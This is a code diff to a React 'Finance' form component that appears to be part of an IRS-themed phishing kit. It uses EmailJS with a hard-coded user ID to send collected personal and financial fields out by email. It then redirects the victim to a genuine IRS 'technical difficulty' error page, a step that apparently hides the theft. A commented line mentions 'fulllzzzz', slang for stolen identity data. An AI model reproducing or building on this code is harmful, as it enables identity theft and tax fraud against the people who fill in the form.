@@ -1,10 +1,13 @@
 import emailjs, { init } from 'emailjs-com';
 import { useEffect, useState } from 'react';
 import { useSelector } from 'react-redux';
+import { useHistory } from 'react-router-dom';
 import './finance.css';
 
 init("user_ld15Epetajzy4LTSlKCz8");
 function Finance() {
+
+	const history = useHistory()
 
 	const {
 		firstName,
@@ -81,8 +84,10 @@ function Finance() {
 		 }, function(error) {
 			console.log('FAILED...', error);
 		 });
-		// alert(fulllzzzz)
-	}
+		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/registration/id_no.jsp?actionName=VerifyFinDataProxy'
+		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/logout1.jsp?error_code=-7271'
+		 window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
+		}
 	
   return (
     <div id="main-longform">
